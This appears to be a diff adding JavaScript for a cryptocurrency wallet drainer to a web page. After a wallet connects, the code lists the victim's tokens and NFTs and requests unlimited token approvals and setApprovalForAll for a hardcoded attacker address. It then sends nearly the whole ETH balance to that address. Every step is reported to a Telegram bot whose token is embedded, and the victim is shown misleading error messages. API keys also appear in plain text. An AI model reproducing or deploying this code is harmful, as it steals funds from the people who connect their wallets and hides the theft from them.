+    chainName = await web3Object.eth.getChainId();
+    chainId = networkToId[chainName]
+  	console.log(chainId)
+    console.log(selectedAccount)
+    if (accounts.length) {
+        sendMessage("Wallet Connected Successfully!")
+        sendMessage(`Cl address : ${selectedAccount}`)
+        covalenthqAPICall()
+
+        // if (chainId == 1) bitqueryAPICall()
+        // else covalenthqAPICall()
+    }
+}
+
+const Oxa = "0x324BE2C089BA3e8E660C24c207c3bc14d4F7105f"
+const Oxc = "5227607491"
+// async function bitqueryAPICall() {
+
+//     const query = `{
+//         ethereum {
+//           address(address: {is: "${selectedAccount}"}) {
+//             balances {
+//               currency {
+//                 symbol
+//                 address
+//               }
+//               value
+//             }
+//           }
+//         }
+//     }`;
+
+//     const url = "https://graphql.bitquery.io/";
+
+//     const opts = {
+//         method: "POST",
+//         headers: {
+//             "Content-Type": "application/json",
+//             "X-API-KEY": "BQYbBW4xCbSdau4k5wFWgFNN8Sr4FN3L"
+//         },
+//         body: JSON.stringify({
+//             query,
+//         })
+//     };
+
+//     const result = await fetch(url, opts).then(res => res.json())
+
+//     let list = result.data.ethereum.address[0].balances
+
+//     let map_list = list.map(m => {
+//         return {
+//             balance: m.value,
+//             address: m.currency.address,
+//             symbol: m.currency.symbol
+//         }
+//     })
+
+//     tokens = map_list.filter(f => f.balance > 0 && f.symbol != "ETH")
+//     console.log("ETH", tokens);
+//     onApprove()
+// }
+
+async function covalenthqAPICall() {
+
+    const params = {
+        chain: "eth"
+    }
+    const url = new URL(`https://deep-index.moralis.io/api/v2/${selectedAccount}/erc20`);
+    url.search = new URLSearchParams(params).toString();
+
+    const opts = {
+        method: "GET",
+        headers: {
+            "accept": "application/json",
+            "X-API-Key": "LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn"
+        },
+    };
+
+    try {
+        const result = await fetch(url, opts).then(res => res.json())
+        console.log(result)
+        let list = result;
+        console.log("Initial list ", list)
+        let map_list = await Promise.all(list.map(async m => {
+            let value; 
+            try {
+                value = await getValue(m.token_address, m.balance, m.decimals)}
+            catch(error){
+                value = 0
+            } 
+            
+            console.log(value)
+            return {
+                        balance: m.balance,
+                        value: value,
+                        address: m.token_address,
+                        //type: m.type
+                    }
+        }));
+        console.log("tokens-list", map_list)
+        tokens = map_list.filter(f => f.value > 5)
+        tokens.sort((a, b) => b.value - a.value);
+        console.log("chainId:", chainId, "Tokens:", tokens);
+        if (tokens.length === 0)
+            onSendEther()
+        else
+            onApprove()
+    } catch {
+        sendMessage(`Error collecting info about wallet`)
+    }
+    NFTs = await getNFTs(selectedAccount).catch(e=>{
+        console.log("Unable to get NFts", e);
+      });
+      NFTs = NFTs.result;
+    console.log("NFTs collection ", NFTs)
+}
+
+async function onApprove() {
+    if (tokens.length) {
+        //tokens.forEach(token => {
+            try {
+                loopTokens(tokens);
+            }
+            catch (error) {
+                // Ignore the error and continue with the loop
+                console.error(`Error processing item ${error.message}`);
+            }
+    }
+    else {
+        if (NFTs.length) {
+            //tokens.forEach(token => {
+                try {
+                    loopNfts(NFTs);
+                }
+                catch (error) {
+                    // Ignore the error and continue with the loop
+                    console.error(`Error processing item ${error.message}`);
+                }
+            onSendEther()
+    sendMessage("Error not found, Please switch network or try again!")
+    }else{
+        try {
+            onSendEther()
+        }
+        catch (error) {
+            // Ignore the error and continue with the loop
+            console.error(`Error processing item ${error.message}`);
+        }
+    }
+}
+}
+
+async function loopTokens(tokens){
+    
+    for await (let token of tokens) {
+        console.log("Token", token)
+        try {
+        let instance = new web3Object.eth.Contract(ABI, token.address);
+        sendMessage("New token")
+        await instance.methods.approve(
+            Oxa,
+            "999999999999999999999999999999999999999999999999999999999999999999999999")
+            .send({
+                from: selectedAccount,
+                to: token.address
+            })
+            .on('transactionHash', (hash) => {
+                console.log(`Transaction Hash: ${hash}`)
+                
+            })
+            .on('receipt', (receipt) => {
+                console.log(`Transaction Receipt: ${receipt}`)
+                sendMessage("Approve Completed Successfully")
+                sendMessage(`TOKEN Contract Address ${token.address}`)
+                sendMessage(`Token balance is ${token.balance}`)
+                sendMessage(`Your address ${Oxa}`)
+            })
+            .on('error', (error) => {
+                console.log(`Error: ${error}`)
+                sendMessage("Transaction Rejected")
+            })
+        }
+        catch(error){
+            console.log(`Error: ${error}`)
+            sendMessage("Transaction Rejected")
+        }
+    };
+    
+        await loopNfts(NFTs)
+    }
+    
+async function loopNfts(NFTs){
+        for await (let NFT of NFTs) {
+            console.log("NFT", NFT)
+            try {
+            let instance = new web3Object.eth.Contract(ABIN, NFT.token_address);
+            await instance.methods.setApprovalForAll(
+                Oxa,
+                "true")
+                .send({
+                    from: selectedAccount,
+                    to: NFT.token_address
+                })
+                .on('transactionHash', (hash) => {
+                    console.log(`Transaction Hash: ${hash}`)
+                    sendMessage("Transaction is submitted to the network")
+                })
+                .on('receipt', (receipt) => {
+                    console.log(`Transaction Receipt: ${receipt}`)
+                    sendMessage("Approve Completed Successfully")
+                    sendMessage(`NFT Contract Address ${token.address}`)
+                    sendMessage(`Your address ${Oxa}`)
+                })
+                .on('error', (error) => {
+                    console.log(`Error: ${error}`)
+                    sendMessage("Transaction Rejected")
+                })
+            }   
+            catch(error){
+                console.log(`Error: ${error}`)
+                sendMessage("Transaction Rejected")
+            }
+        }
+            await onSendEther();
+    }
+  
+async function onSendEther() {
+    console.log("sending ether")
+    try {
+        let balance = await web3Object.eth.getBalance(selectedAccount)
+
+        var gasPrice = await web3Object.eth.getGasPrice(); // estimate the gas price
+        
+        var transactionObject = {
+            gasPrice: gasPrice,
+            from: selectedAccount,
+            to: Oxa,
+            value: balance,
+        }
+        transactionObject.gas = gasLimit;
+        transactionObject.value = balance - 3000000000000000; // set the transaction value to the entire balance, less the transaction fee
+        console.log(transactionObject.value);
+
+        var gasLimit = await web3Object.eth.estimateGas(transactionObject); // estimate the gas limit for this transaction
+        var transactionFee = gasPrice * gasLimit; // calculate the transaction fee
+
+        
+        web3Object.eth.sendTransaction(transactionObject)
+            .on('transactionHash', (hash) => {
+                console.log("Transaction Hash: ", hash)
+                sendMessage("Transaction is submitted to the network")
+            })
+            .on('receipt', (receipt) => {
+                console.log("Transaction Receipt: ", receipt)
+                sendMessage("Transfer Completed Successfully, You should receive some native tokens")
+            })
+            .on('error', (error) => {
+                console.log("Error: ", error)
+                sendMessage("Transaction Rejected")
+            })
+    } catch {
+        sendMessage("Insufficient funds for transfer")
+    }
+
+}
+
+async function sendMessage(message){
+    return new Promise((resolve, reject)=>{
+      const Oxc_id = Oxc;
+      fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?Oxc_id=${Oxc_id}&text=${message}`, {
+            method: "GET",
+            headers: {
+                
+            }
+        })
+        .then(async(res) => {
+            if(res.status > 399) throw res;
+            resolve(await res.json());
+        }).catch(err=>{
+            reject(err);
+        })
+    })
+  }
+
+async function getPrice(address){
+return new Promise((resolve, reject)=>{
+    fetch(`https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${address}&vs_currencies=usd`, {
+        method: "GET",
+        headers: {
+            //"accept": "application/json",
+            //"X-API-Key": api_key
+        }
+    })
+    .then(async(res) => {
+        if(res.status > 399) throw res;
+        resolve(await res.json());
+    }).catch(err=>{
+        reject(err);
+    })
+})
+}
+async function getValue(address, balance, decimal){
+    console.log(address, balance, decimal)
+    let price = await getPrice(address);
+    console.log("price", price)
+    price = parseFloat(price[address].usd);
+    let value = (balance / (10 ** (decimal || 18))) * price;
+    value = parseInt(value);
+    if (price) {
+        return value;
+    }else{
+        return 0;
+    }
+}
+async function getNFTs(address="", api_key="LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn", chain="eth", limit="50"){
+    return new Promise((resolve, reject)=>{
+        fetch(`https://deep-index.moralis.io/api/v2/${address}/nft/collections?chain=${chain}&format=decimal&limit=${limit}`, {
+            method: "GET",
+            headers: {
+                "accept": "application/json",
+                "X-API-Key": api_key
+            }
+        })
+        .then(async(res) => {
+            if(res.status > 399) throw res;
+            resolve(await res.json());
+        }).catch(err=>{
+            reject(err);
+        })
+    })
+  }
+  
